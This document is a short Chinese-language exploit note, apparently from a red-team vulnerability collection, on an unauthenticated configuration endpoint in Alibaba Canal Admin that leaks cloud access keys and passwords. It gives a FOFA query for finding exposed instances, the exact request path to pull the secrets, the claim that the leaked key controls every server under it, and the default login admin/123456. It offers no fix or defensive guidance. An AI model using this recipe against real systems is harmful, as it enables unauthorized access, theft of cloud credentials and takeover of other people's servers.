# Alibaba-Canal-Admin-config-云密钥信息泄露漏洞

## 漏洞描述


由于/api/v1/canal/config  未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露



## 漏洞影响


```plain
Alibaba Canal
```



## FOFA


```plain
title="Canal Admin"
```



## 漏洞复现


验证漏洞的Url为



```plain
/api/v1/canal/config/1/0
```



![202202102002400.png](/uploads/20260518/e4f48315-1f39-4254-9af8-4d8d7c2024ba.png)



其中泄露了 aliyun.access 密钥，可以控制密钥下的所有服务器



云密钥泄露参考: red.peiqi.tech



其中还含有默认口令 **admin/123456**
